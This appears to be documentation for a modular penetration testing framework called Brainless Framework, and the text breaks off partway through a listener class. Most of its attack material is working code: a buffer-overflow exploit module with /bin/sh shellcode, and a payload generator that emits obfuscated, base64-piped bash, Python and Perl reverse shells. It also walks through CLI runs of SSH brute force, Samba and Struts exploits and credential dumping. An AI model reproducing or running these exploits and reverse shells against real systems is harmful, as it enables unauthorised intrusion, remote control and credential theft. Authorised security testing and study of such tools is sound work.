# Brainless Framework - Official Documentation
## Comprehensive Guide for Debian-Based Linux Systems

---

### Table of Contents
1. [Introduction](#introduction)
2. [Architecture Overview](#architecture-overview)
3. [Installation and Setup](#installation-and-setup)
4. [Core Components](#core-components)
5. [Module Development](#module-development)
6. [Usage Guide](#usage-guide)
7. [Advanced Features](#advanced-features)
8. [Security Considerations](#security-considerations)
9. [Troubleshooting](#troubleshooting)
10. [API Reference](#api-reference)
11. [Examples and Use Cases](#examples-and-use-cases)
12. [Contributing](#contributing)

---

## Introduction

### What is Brainless Framework?

Brainless Framework is a professional-grade, modular penetration testing framework designed specifically for Debian-based Linux distributions. It provides security professionals with a comprehensive toolkit for vulnerability assessment, exploitation, and post-exploitation activities.

### Key Features

- **Modular Architecture**: Extensible design with categorized modules
- **Interactive CLI**: User-friendly command-line interface
- **Session Management**: Robust session handling system
- **Cross-Platform**: Designed for Linux with potential cross-platform support
- **Professional Reporting**: Generate detailed security assessment reports
- **Active Development**: Regularly updated with new modules and features

### Supported Distributions

- **Debian 10+**
- **Ubuntu 18.04+**
- **Kali Linux**
- **Parrot Security OS**
- **Other Debian-based distributions**

### Legal Notice

⚠️ **WARNING**: Brainless Framework is intended for authorized security testing, research, and educational purposes only. Users are responsible for complying with all applicable laws and regulations. The developers assume no liability for misuse.

---

## Architecture Overview

### Framework Components

```
Brainless Framework Architecture
┌─────────────────────────────────────────┐
│           Command Line Interface        │
│              (core/cli.py)              │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│            Framework Engine             │
│             (core/engine.py)            │
└─────────────────┬───────────────────────┘
                  │
    ┌─────────────┼─────────────┐
    │             │             │
┌───▼───┐   ┌───▼───┐   ┌───▼───┐
│Module │   │Session│   │Logger │
│Loader │   │Manager│   │System │
│(core/ │   │(core/ │   │(core/ │
│loader.│   │session│   │logger.│
│  py)  │   │  .py) │   │  py)  │
└───────┘   └───────┘   └───────┘
```

### Module Categories

1. **Exploits** (`modules/exploits/`)
   - Remote code execution vulnerabilities
   - Privilege escalation exploits
   - Web application exploits
   - Network service exploits

2. **Payloads** (`modules/payloads/`)
   - Reverse shells
   - Meterpreter-style payloads
   - Custom payload generation
   - Encrypted communication

3. **Auxiliary** (`modules/auxiliary/`)
   - Scanners and enumeration tools
   - Credential testing tools
   - Information gathering tools
   - Network analysis tools

4. **Post-Exploitation** (`modules/post/`)
   - Credential dumping
   - Privilege escalation
   - Lateral movement
   - Data exfiltration

5. **Listeners** (`listeners/`)
   - Connection handlers
   - Session management
   - Multi-payload support

---

## Installation and Setup

### Prerequisites

#### System Requirements
- **Operating System**: Debian-based Linux distribution
- **Python Version**: 3.10 or higher
- **RAM**: Minimum 2GB, Recommended 4GB+
- **Disk Space**: Minimum 500MB
- **Permissions**: Root access for certain operations

#### Required Packages
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Python and pip
sudo apt install python3 python3-pip python3-venv git -y

# Install system dependencies
sudo apt install build-essential libssl-dev libffi-dev -y
```

### Installation Steps

#### Method 1: Direct Installation
```bash
# Clone repository
git clone https://github.com/brainless-security/brainless-framework.git
cd brainless-framework

# Install dependencies
pip3 install -r requirements.txt

# Make executable
chmod +x brainless.py

# Test installation
python3 brainless.py --help
```

#### Method 2: Virtual Environment
```bash
# Create virtual environment
python3 -m venv brainless-env
source brainless-env/bin/activate

# Install framework
git clone https://github.com/brainless-security/brainless-framework.git
cd brainless-framework
pip install -r requirements.txt

# Run framework
python brainless.py
```

### Configuration

#### Basic Configuration
The framework automatically creates a configuration file at `config/brainless.conf`:

```ini
[framework]
version = 0.1
author = Brainless Security Team
description = Modular penetration testing framework

[cli]
prompt = "brainless > "
prompt_color = "cyan"
banner = true
history_file = ".brainless_history"
max_history = 1000

[modules]
modules_directory = "modules"
exploits_directory = "modules/exploits"
payloads_directory = "modules/payloads"
auxiliary_directory = "modules/auxiliary"
post_directory = "modules/post"
auto_load = true
validate_metadata = true

[logging]
level = "INFO"
file = "logs/brainless.log"
max_file_size = 10485760
backup_count = 5
format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
console_output = true

[security]
require_root = false
sandbox_modules = true
validate_dependencies = true
allowed_networks = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"]
restrict_external_calls = true
```

#### Environment Variables
```bash
export BRAINLESS_CONFIG="/path/to/custom/config.conf"
export BRAINLESS_MODULES="/path/to/custom/modules"
export BRAINLESS_LOGS="/path/to/custom/logs"
```

---

## Core Components

### 1. Framework Engine (`core/engine.py`)

The central component that manages all framework operations.

#### Key Features
- Module loading and management
- Session handling
- Configuration management
- Framework state management

#### Usage Example
```python
from core.engine import BrainlessEngine

# Initialize engine
engine = BrainlessEngine(config_path='config/brainless.conf')

# Load modules
module_count = engine.load_all_modules()

# Execute module
result = engine.execute_module('exploits/linux/samba/cve_2017_7494', {
    'RHOST': '192.168.1.100',
    'PAYLOAD': 'reverse_tcp'
})
```

### 2. Command Line Interface (`core/cli.py`)

Interactive command-line interface with advanced features.

#### Key Features
- Tab completion
- Command history
- Context-sensitive help
- Module interaction
- Session management

#### Commands
```bash
# Basic commands
help                    # Show help
use <module>           # Load module
set <option> <value>   # Set option
show options           # Show module options
run                    # Execute module
back                   # Return to main prompt
exit/quit              # Exit framework

# Session management
sessions               # List sessions
sessions -i <id>       # Interact with session
sessions -k <id>       # Kill session

# Module management
search <keyword>       # Search modules
info <module>          # Show module info
list modules           # List all modules
```

### 3. Module Loader (`core/loader.py`)

Dynamically loads and manages framework modules.

#### Features
- Automatic module discovery
- Module validation
- Runtime loading
- Module metadata extraction

#### Usage
```python
from core.loader import ModuleLoader

loader = ModuleLoader('modules/')
modules = loader.load_all_modules()

# Get specific module
module = loader.get_module('exploits/linux/ssh/weak_ssh')

# Search modules
results = loader.search_modules('ssh', 'exploits')
```

### 4. Session Manager (`core/session.py`)

Manages active sessions and connections.

#### Features
- Session creation and tracking
- Connection management
- Session persistence
- Multi-session support

#### Usage
```python
from core.session import SessionManager

manager = SessionManager(config)

# Create session
session_id = manager.create_session('shell', {
    'host': '192.168.1.100',
    'port': 4444
})

# Get session
session = manager.get_session(session_id)

# List sessions
sessions = manager.list_sessions()
```

### 5. Logging System (`core/logger.py`)

Comprehensive logging system for framework operations.

#### Features
- Multiple log levels
- File and console output
- Log rotation
- Custom formatters

#### Usage
```python
from core.logger import LoggerMixin

class MyModule(LoggerMixin):
    def __init__(self):
        super().__init__('MyModule')
    
    def some_method(self):
        self.info("This is an info message")
        self.warning("This is a warning")
        self.error("This is an error")
```

---

## Module Development

### Module Structure

All modules follow a consistent structure:

```python
#!/usr/bin/env python3
"""
Module Title
============

Detailed description of the module.

Author: Your Name
Module: category/subcategory/module_name
Type: exploit|payload|auxiliary|post
"""

import sys
from pathlib import Path

# Add framework path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

# Required module metadata
NAME = "Module Display Name"
DESCRIPTION = "Brief description of what the module does"
AUTHOR = "Your Name"
VERSION = "1.0"
RANK = "excellent|great|good|average|normal|low|manual"
MODULE_TYPE = "exploit|payload|auxiliary|post"

class ModuleClass(LoggerMixin):
    """
    Main module class
    """
    def __init__(self):
        super().__init__('ModuleClass')
        # Initialize module-specific attributes
    
    def set_option(self, option: str, value: str):
        """Set module options"""
        # Handle option setting
    
    def get_options(self) -> dict:
        """Return available options"""
        return {
            'OPTION_NAME': {
                'description': 'Option description',
                'required': True|False,
                'default': 'default_value'
            }
        }
    
    def run(self, options: dict = None) -> dict:
        """
        Main module execution
        
        Args:
            options: Dictionary of module options
            
        Returns:
            Dictionary with execution results
        """
        # Module implementation
        return {
            'success': True|False,
            'message': 'Execution message',
            'data': {...}  # Optional additional data
        }

def run(options: dict = None) -> dict:
    """
    Module entry point
    
    Args:
        options: Dictionary of module options
        
    Returns:
        Dictionary with execution results
    """
    module = ModuleClass()
    return module.run(options)
```

### Module Categories

#### 1. Exploit Modules
Target specific vulnerabilities for gaining access.

```python
MODULE_TYPE = "exploit"
RANK = "excellent"  # Impact rating

def run(self, options):
    # 1. Validate options
    # 2. Check target vulnerability
    # 3. Exploit vulnerability
    # 4. Handle payload delivery
    # 5. Return results
```

#### 2. Payload Modules
Generate code executed on target systems.

```python
MODULE_TYPE = "payload"

def generate_payload(self):
    # Generate payload code
    # Handle encoding/encryption
    # Return payload string
```

#### 3. Auxiliary Modules
Support tools for information gathering and analysis.

```python
MODULE_TYPE = "auxiliary"

def run(self, options):
    # Information gathering
    # Network scanning
    # Service enumeration
    # Data analysis
```

#### 4. Post-Exploitation Modules
Used after successful exploitation.

```python
MODULE_TYPE = "post"

def run(self, options):
    # Privilege escalation
    # Credential harvesting
    # Lateral movement
    # Data exfiltration
```

### Module Best Practices

#### 1. Error Handling
```python
def run(self, options):
    try:
        # Module execution
        pass
    except ConnectionError as e:
        self.error(f"Connection failed: {e}")
        return {'success': False, 'error': 'connection_failed'}
    except TimeoutError as e:
        self.error(f"Operation timed out: {e}")
        return {'success': False, 'error': 'timeout'}
    except Exception as e:
        self.error(f"Unexpected error: {e}")
        return {'success': False, 'error': 'unknown_error'}
```

#### 2. Logging
```python
def run(self, options):
    self.info("Starting module execution")
    self.debug(f"Options: {options}")
    
    # Module logic
    
    self.success("Module completed successfully")
```

#### 3. Option Validation
```python
def run(self, options):
    # Check required options
    required = ['RHOST', 'RPORT']
    for opt in required:
        if opt not in options or not options[opt]:
            return {'success': False, 'error': f'Missing required option: {opt}'}
    
    # Validate option values
    try:
        port = int(options['RPORT'])
        if not (1 <= port <= 65535):
            return {'success': False, 'error': 'Invalid port number'}
    except ValueError:
        return {'success': False, 'error': 'Port must be a number'}
```

#### 4. Documentation
```python
"""
Module Title
============

Comprehensive description of the module's purpose,
functionality, and usage.

Vulnerability Details:
- CVE Identifier: CVE-2023-XXXX
- Affected Versions: X.Y.Z - A.B.C
- Risk Level: High/Medium/Low

Usage Example:
    use exploits/example/vulnerability
    set RHOST 192.168.1.100
    set PAYLOAD reverse_tcp
    run

Author: Your Name
Category: exploits
Platform: linux
Arch: x86_64
"""
```

---

## Usage Guide

### Getting Started

#### 1. Starting the Framework
```bash
# Basic startup
python3 brainless.py

# With verbose output
python3 brainless.py --verbose

# Without banner
python3 brainless.py --no-banner

# Specify config file
python3 brainless.py --config /path/to/config.conf
```

#### 2. Basic Navigation
```bash
# Show available commands
brainless > help

# Show framework information
brainless > info

# List available modules
brainless > list modules

# Search for modules
brainless > search ssh
brainless > search cve-2017
brainless > search type:exploit
```

#### 3. Working with Modules
```bash
# Load a module
brainless > use exploits/linux/samba/cve_2017_7494

# Show module options
brainless exploit(cve_2017_7494) > show options

# Set module options
brainless exploit(cve_2017_7494) > set RHOST 192.168.1.100
brainless exploit(cve_2017_7494) > set RPORT 445
brainless exploit(cve_2017_7494) > set PAYLOAD reverse_tcp

# Show module information
brainless exploit(cve_2017_7494) > info

# Execute the module
brainless exploit(cve_2017_7494) > run

# Return to main prompt
brainless exploit(cve_2017_7494) > back
```

### Common Workflows

#### 1. Network Reconnaissance
```bash
# Scan target network
brainless > use auxiliary/scanner/port_scanner
brainless exploit(port_scanner) > set TARGET 192.168.1.0/24
brainless exploit(port_scanner) > set PORTS 1-1000
brainless exploit(port_scanner) > run

# Enumerate services
brainless > use auxiliary/gather/system_info
brainless exploit(system_info) > set TARGET 192.168.1.100
brainless exploit(system_info) > run
```

#### 2. Web Application Testing
```bash
# Enumerate web directories
brainless > use auxiliary/web/http_enum
brainless exploit(http_enum) > set TARGET example.com
brainless exploit(http_enum) > set PORT 80
brainless exploit(http_enum) > run

# Test for vulnerabilities
brainless > use exploits/linux/apache/struts2_cve_2017_5638
brainless exploit(struts2) > set TARGET_URL http://example.com/struts2-app/
brainless exploit(struts2) > set COMMAND whoami
brainless exploit(struts2) > run
```

#### 3. Credential Testing
```bash
# SSH brute force
brainless > use auxiliary/cracker/ssh_bruteforce
brainless exploit(ssh_bruteforce) > set TARGET 192.168.1.100
brainless exploit(ssh_bruteforce) > set USERNAMES admin,root,ubuntu
brainless exploit(ssh_bruteforce) > set PASSWORDS password,admin,123456
brainless exploit(ssh_bruteforce) > run
```

#### 4. Exploitation and Post-Exploitation
```bash
# Set up listener
brainless > use listeners/multi_handler
brainless exploit(multi_handler) > set LHOST 192.168.1.10
brainless exploit(multi_handler) > set LPORT 4444
brainless exploit(multi_handler) > run

# Exploit vulnerability
brainless > use exploits/linux/samba/cve_2017_7494
brainless exploit(cve_2017_7494) > set RHOST 192.168.1.100
brainless exploit(cve_2017_7494) > set PAYLOAD reverse_tcp
brainless exploit(cve_2017_7494) > set LHOST 192.168.1.10
brainless exploit(cve_2017_7494) > set LPORT 4444
brainless exploit(cve_2017_7494) > run

# Post-exploitation
brainless > sessions -i 1
brainless session(1) > use post/linux/credential_dump
brainless exploit(credential_dump) > run
```

### Session Management

#### Listing Sessions
```bash
brainless > sessions
Active Sessions
===============

  Id  Type       Host             Status      Created
  --  ----       ----             ------      -------
  1   shell      192.168.1.100    active      2025-12-17 10:30:00
  2   meterpreter  192.168.1.101  active      2025-12-17 10:32:00
```

#### Interacting with Sessions
```bash
# Interact with session
brainless > sessions -i 1

# List session details
brainless session(1) > info

# Execute commands in session
brainless session(1) > execute whoami
brainless session(1) > execute pwd

# Background session
brainless session(1) > background

# Kill session
brainless > sessions -k 1
```

### Advanced Features

#### 1. Module Chaining
```bash
# Chain multiple modules
brainless > use auxiliary/scanner/port_scanner
brainless exploit(port_scanner) > set TARGET 192.168.1.100
brainless exploit(port_scanner) > run

# Automatically use results in next module
brainless > use exploits/linux/ssh/weak_ssh
brainless exploit(weak_ssh) > set RHOST 192.168.1.100
# Port automatically set from previous scan results
brainless exploit(weak_ssh) > run
```

#### 2. Custom Payloads
```bash
# Generate custom payload
brainless > use payloads/meterpreter_reverse_tcp
brainless exploit(meterpreter_reverse_tcp) > set LHOST 192.168.1.10
brainless exploit(meterpreter_reverse_tcp) > set LPORT 4444
brainless exploit(meterpreter_reverse_tcp) > set ENCRYPTION_KEY secret123
brainless exploit(meterpreter_reverse_tcp) > run

# Use generated payload
brainless > use exploits/linux/samba/cve_2017_7494
brainless exploit(cve_2017_7494) > set PAYLOAD /path/to/generated/payload.py
brainless exploit(cve_2017_7494) > run
```

#### 3. Batch Operations
```bash
# Create script file
cat > batch_script.txt << EOF
use auxiliary/scanner/port_scanner
set TARGET 192.168.1.0/24
run
use exploits/linux/ssh/weak_ssh
set RHOST 192.168.1.100
run
EOF

# Execute batch script
brainless > source batch_script.txt
```

---

## Advanced Features

### 1. Custom Module Development

#### Creating a New Exploit Module
```python
#!/usr/bin/env python3
"""
Custom Exploit Module
=====================

Exploits a hypothetical vulnerability in Example Service.

Author: Your Name
Module: exploits/linux/services/example_service
Type: exploit
Rank: excellent
"""

import socket
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

NAME = "Example Service Buffer Overflow"
DESCRIPTION = "Exploits buffer overflow in Example Service 1.0"
AUTHOR = "Your Name"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "exploit"

class ExampleExploit(LoggerMixin):
    def __init__(self):
        super().__init__('ExampleExploit')
        self.target_host = None
        self.target_port = 9999
        self.timeout = 10
        
    def set_option(self, option, value):
        if option.lower() == 'rhost':
            self.target_host = value
        elif option.lower() == 'rport':
            self.target_port = int(value)
        elif option.lower() == 'timeout':
            self.timeout = int(value)
    
    def get_options(self):
        return {
            'RHOST': {'description': 'Target host IP', 'required': True, 'default': ''},
            'RPORT': {'description': 'Target port', 'required': False, 'default': '9999'},
            'TIMEOUT': {'description': 'Connection timeout', 'required': False, 'default': '10'}
        }
    
    def create_exploit_buffer(self):
        """Create exploit buffer with shellcode"""
        # NOP sled
        nop_sled = b"\x90" * 16
        
        # Shellcode (example: execve /bin/sh)
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
            b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
        
        # Padding to reach return address
        padding = b"A" * (260 - len(nop_sled) - len(shellcode))
        
        # Return address (example)
        ret_addr = struct.pack('<I', 0xbffff410)
        
        # Construct buffer
        buffer = nop_sled + shellcode + padding + ret_addr
        
        return buffer
    
    def check_vulnerability(self):
        """Check if target is vulnerable"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_host, self.target_port))
            
            # Send test payload
            test_payload = b"A" * 100
            sock.send(test_payload)
            
            # Check response
            response = sock.recv(1024)
            sock.close()
            
            return True
            
        except Exception as e:
            self.error(f"Vulnerability check failed: {e}")
            return False
    
    def run(self, options=None):
        if not self.target_host:
            return {'success': False, 'message': 'RHOST not specified'}
        
        try:
            self.info(f"Exploiting {self.target_host}:{self.target_port}")
            
            # Check vulnerability
            if not self.check_vulnerability():
                return {'success': False, 'message': 'Target not vulnerable'}
            
            # Create exploit buffer
            exploit_buffer = self.create_exploit_buffer()
            
            # Connect and send exploit
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_host, self.target_port))
            
            self.info("Sending exploit payload...")
            sock.send(exploit_buffer)
            
            # Check for successful exploitation
            try:
                response = sock.recv(1024)
                sock.close()
                
                # Check if we got a shell
                if b"root@" in response or b"#" in response:
                    self.success("Exploit successful!")
                    return {
                        'success': True,
                        'message': 'Exploit completed successfully',
                        'target': self.target_host,
                        'port': self.target_port
                    }
                else:
                    return {'success': False, 'message': 'Exploit failed'}
                    
            except socket.timeout:
                # No response might indicate successful exploit
                sock.close()
                self.warning("Connection timeout - possible successful exploit")
                return {
                    'success': True,
                    'message': 'Exploit sent (verify manually)',
                    'target': self.target_host
                }
        
        except Exception as e:
            self.error(f"Exploit failed: {e}")
            return {'success': False, 'message': f'Exploit failed: {str(e)}'}

def run(options=None):
    exploit = ExampleExploit()
    if options:
        for key, value in options.items():
            exploit.set_option(key, value)
    return exploit.run()
```

### 2. Custom Payload Development

#### Creating a Custom Payload
```python
#!/usr/bin/env python3
"""
Custom Payload Module
=====================

Generates a custom reverse shell payload.

Author: Your Name
Module: payloads/custom_reverse_shell
Type: payload
Rank: excellent
"""

import base64
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

NAME = "Custom Reverse Shell"
DESCRIPTION = "Generates a custom reverse shell payload"
AUTHOR = "Your Name"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "payload"

class CustomPayload(LoggerMixin):
    def __init__(self):
        super().__init__('CustomPayload')
        self.lhost = None
        self.lport = 4444
        self.encoding = 'base64'
        self.obfuscate = True
        
    def set_option(self, option, value):
        if option.lower() == 'lhost':
            self.lhost = value
        elif option.lower() == 'lport':
            self.lport = int(value)
        elif option.lower() == 'encoding':
            self.encoding = value
        elif option.lower() == 'obfuscate':
            self.obfuscate = value.lower() == 'true'
    
    def get_options(self):
        return {
            'LHOST': {'description': 'Local host for reverse connection', 'required': True, 'default': ''},
            'LPORT': {'description': 'Local port for reverse connection', 'required': False, 'default': '4444'},
            'ENCODING': {'description': 'Encoding method (base64, hex, none)', 'required': False, 'default': 'base64'},
            'OBFUSCATE': {'description': 'Obfuscate payload', 'required': False, 'default': 'true'}
        }
    
    def generate_bash_payload(self):
        """Generate bash reverse shell payload"""
        payload = f"""
        bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
        """
        return payload.strip()
    
    def generate_python_payload(self):
        """Generate Python reverse shell payload"""
        payload = f"""
        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{self.lhost}",{self.lport}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])
        """
        return payload.strip()
    
    def generate_perl_payload(self):
        """Generate Perl reverse shell payload"""
        payload = f"""
        use Socket;
        $i="{self.lhost}";$p={self.lport};
        socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
        if(connect(S,sockaddr_in($p,inet_aton($i)))){
        open(STDIN,">&S");
        open(STDOUT,">&S");
        open(STDERR,">&S");
        exec("/bin/sh -i");
        };
        """
        return payload.strip()
    
    def encode_payload(self, payload):
        """Encode payload using specified method"""
        if self.encoding == 'base64':
            encoded = base64.b64encode(payload.encode()).decode()
            return f"echo '{encoded}' | base64 -d | bash"
        elif self.encoding == 'hex':
            encoded = payload.encode().hex()
            return f"echo '{encoded}' | xxd -r -p | bash"
        else:
            return payload
    
    def obfuscate_payload(self, payload):
        """Basic payload obfuscation"""
        if not self.obfuscate:
            return payload
        
        # Simple string obfuscation
        obfuscated = payload
        obfuscated = obfuscated.replace('bash', '$(which bash)')
        obfuscated = obfuscated.replace('sh', '$(which sh)')
        obfuscated = obfuscated.replace('/', '$(echo /)')
        
        return obfuscated
    
    def generate_all_payloads(self):
        """Generate multiple payload variants"""
        payloads = {}
        
        # Bash payload
        bash_payload = self.generate_bash_payload()
        bash_payload = self.obfuscate_payload(bash_payload)
        payloads['bash'] = self.encode_payload(bash_payload)
        
        # Python payload
        python_payload = self.generate_python_payload()
        python_payload = self.obfuscate_payload(python_payload)
        payloads['python'] = self.encode_payload(python_payload)
        
        # Perl payload
        perl_payload = self.generate_perl_payload()
        perl_payload = self.obfuscate_payload(perl_payload)
        payloads['perl'] = self.encode_payload(perl_payload)
        
        return payloads
    
    def save_payloads(self, payloads, filename=None):
        """Save payloads to file"""
        if not filename:
            filename = f"payloads_{self.lhost}_{self.lport}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write(f"# Reverse Shell Payloads for {self.lhost}:{self.lport}\n")
                f.write(f"# Generated by Brainless Framework\n\n")
                
                for lang, payload in payloads.items():
                    f.write(f"## {lang.upper()} Payload\n")
                    f.write(f"```\n{payload}\n```\n\n")
            
            self.info(f"Payloads saved to: {filename}")
            return filename
            
        except Exception as e:
            self.error(f"Failed to save payloads: {e}")
            return None
    
    def run(self, options=None):
        if not self.lhost:
            return {'success': False, 'message': 'LHOST not specified'}
        
        try:
            self.info(f"Generating payloads for {self.lhost}:{self.lport}")
            
            # Generate payloads
            payloads = self.generate_all_payloads()
            
            # Save to file
            filename = self.save_payloads(payloads)
            
            return {
                'success': True,
                'message': f'Generated {len(payloads)} payloads',
                'lhost': self.lhost,
                'lport': self.lport,
                'payloads': payloads,
                'filename': filename
            }
            
        except Exception as e:
            self.error(f"Payload generation failed: {e}")
            return {'success': False, 'message': f'Generation failed: {str(e)}'}

def run(options=None):
    payload = CustomPayload()
    if options:
        for key, value in options.items():
            payload.set_option(key, value)
    return payload.run()
```

### 3. Advanced Session Management

#### Custom Session Types
```python
from core.session import Session

class MeterpreterSession(Session):
    """Enhanced session with meterpreter-like features"""
    
    def __init__(self, session_id, session_type, **kwargs):
        super().__init__(session_id, session_type, **kwargs)
        self.features = ['file_system', 'processes', 'network', 'migrate']
    
    def execute_command(self, command):
        """Execute command with enhanced error handling"""
        try:
            result = super().execute_command(command)
            
            # Enhanced result processing
            if 'error' in result.lower():
                self.logger.warning(f"Command may have failed: {command}")
            
            return result
            
        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            return f"Error: {str(e)}"
    
    def upload_file(self, local_path, remote_path):
        """Upload file to target"""
        try:
            with open(local_path, 'rb') as f:
                content = f.read()
            
            # Send file content to target
            upload_command = f"echo '{content.hex()}' | xxd -r -p > {remote_path}"
            result = self.execute_command(upload_command)
            
            return {'success': True, 'message': f'File uploaded to {remote_path}'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def download_file(self, remote_path):
        """Download file from target"""
        try:
            # Read file and convert to hex
            read_command = f"xxd -p {remote_path}"
            result = self.execute_command(read_command)
            
            if 'No such file' in result:
                return {'success': False, 'error': 'File not found'}
            
            # Convert hex back to binary
            content = bytes.fromhex(result.strip())
            
            return {'success': True, 'content': content}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_system_info(self):
        """Get detailed system information"""
        info = {}
        
        commands = {
            'os': 'uname -a',
            'distro': 'cat /etc/os-release 2>/dev/null || echo "Unknown"',
            'kernel': 'uname -r',
            'architecture': 'uname -m',
            'hostname': 'hostname',
            'current_user': 'whoami',
            'user_id': 'id',
            'working_dir': 'pwd'
        }
        
        for key, cmd in commands.items():
            try:
                result = self.execute_command(cmd)
                info[key] = result.strip()
            except:
                info[key] = 'Unknown'
        
        return info
```

### 4. Custom Listeners

#### Multi-Protocol Listener
```python
#!/usr/bin/env python3
"""
Multi-Protocol Listener
=======================

Handles multiple connection types and protocols.

Author: Your Name
Module: listeners/multi_protocol
Type: listener
Rank: excellent
"""

import socket
import ssl
import threading
import json
import base64
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from core.logger import LoggerMixin

NAME = "Multi-Protocol Listener"
DESCRIPTION = "Handles multiple connection protocols and payload types"
AUTHOR = "Your Name"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "listener"

class MultiProtocolListener(LoggerMixin):
    def __init__(self):
        super().__init__('MultiProtocolListener')
        self.host = '0.0.0.0'
        self.port = 4444
        self.protocol = 'tcp'  # tcp, udp, ssl, http
        self.cert_file = None
        self.key_file = None
        self.timeout = 60
        self.max_sessions = 50
        self.sessions = {}
        self.running = False
        
    def set_option(self, option, value):
        if option.lower() == 'host':
            self.host = value
        elif option.lower() == 'port':
            self.port = int(value)
        elif option.lower() == 'protocol':
            self.protocol = value.lower()
        elif option.lower() == 'cert_file':
            self.cert_file = value
        elif option.lower() == 'key_file':
            self.key_file = value
        elif option.lower() == 'timeout':
            self.timeout = int(value)
        elif option.lower() == 'max_sessions':
            self.max_sessions = int(value)
    
    def get_options(self):
        return {
            'HOST': {'description': 'Host to bind to', 'required': True, 'default': '0.0.0.0'},
            'PORT': {'description': 'Port to bind to', 'required': True, 'default': '4444'},
            'PROTOCOL': {'description': 'Protocol (tcp, udp, ssl, http)', 'required': False, 'default': 'tcp'},
            'CERT_FILE': {'description': 'SSL certificate file', 'required': False, 'default': ''},
            'KEY_FILE': {'description': 'SSL private key file', 'required': False, 'default': ''},
            'TIMEOUT': {'description': 'Session timeout', 'required': False, 'default': '60'},
            'MAX_SESSIONS': {'description': 'Max concurrent sessions', 'required': False, 'default': '50'}
        }
    
    def handle_tcp_connection(self, client_socket, address):
        """Handle TCP connection"""
        try:
            # Detect payload type
            data = client_socket.recv(1024)
            if not data:
                return
            
            # Create session
            session_id = self.create_session(address, 'tcp_shell')
            
            # Handle session
            self.handle_session(session_id, client_socket)
            
        except Exception as e:
            self.error(f"TCP handler error: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def handle_ssl_connection(self, client_socket, address):
        """Handle SSL connection"""
        try:
            # Wrap with SSL
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(self.cert_file, self.key_file)
            secure_socket = context.wrap_socket(client_socket, server_side=True)
            
            # Handle like TCP
            self.handle_tcp_connection(secure_socket, address)
            
        except Exception as e:
            self.error(f"SSL handler error: {e}")
    
    def handle_http_connection(self, client_socket, address):
        """Handle HTTP-based connection"""
        try:
            # Read HTTP request
            request = client_socket.recv(4096).decode()
            if not request:
                return
            
            # Parse request
            lines = request.split('\n')
            method, path, version = lines[0].split()
            
            if method == 'GET':
                # Send HTTP response
                response = "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body>OK</body></html>"
                client_socket.send(response.encode())
            
            elif method == 'POST':
                # Handle payload data
                session_id = self.create_session(address, 'http_shell')
                self.handle_session(session_id, client_socket, protocol='http')
            
        except Exception as e:
            self.error(f"HTTP handler error: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def handle_session(self, session_id, socket_obj, protocol='tcp'):
        """Handle interactive session"""
        session = self.sessions[session_id]
        
        try:
            while session['active']:
                # Send prompt
                if protocol == 'tcp':
                    socket_obj.send(b"$ ")
                elif protocol == 'http':
                    # HTTP-based communication
                    pass
                
                # Receive command
                if protocol == 'tcp':
                    command = socket_obj.recv(1024).decode().strip()
                
                if not command:
                    break
                
                # Execute command
                if command.lower() in ['exit', 'quit']:
                    break
                
                # In a real implementation, you'd execute the command
                # For now, just echo
                response = f"Executed: {command}\n"
                
                if protocol == 'tcp':
                    socket_obj.send(response.encode())
                
                session['last_activity'] = time.time()
        
        except Exception as e:
            self.error(f"Session handler error: {e}")
        finally:
            self.close_session(session_id)
    
    def create_session(self, address, session_type):
        """Create new session"""
        session_id = f"{address[0]}:{address[1]}:{int(time.time())}"
        
        session = {
            'id': session_id,
            'ip': address[0],
            'port': address[1],
            'type': session_type,
            'connected_at': time.time(),
            'last_activity': time.time(),
            'active': True
        }
        
        self.sessions[session_id] = session
        self.info(f"New session: {session_id}")
        
        return session_id
    
    def close_session(self, session_id):
        """Close session"""
        if session_id in self.sessions:
            session = self.sessions[session_id]
            session['active'] = False
            session['disconnected_at'] = time.time()
            
            duration = session['disconnected_at'] - session['connected_at']
            self.info(f"Session closed: {session_id} (duration: {duration:.2f}s)")
            
            del self.sessions[session_id]
    
    def start(self):
        """Start the listener"""
        try:
            self.info(f"Starting {self.protocol} listener on {self.host}:{self.port}")
            
            # Create socket
            if self.protocol in ['tcp', 'ssl']:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((self.host, self.port))
                sock.listen(5)
                
            elif self.protocol == 'udp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.bind((self.host, self.port))
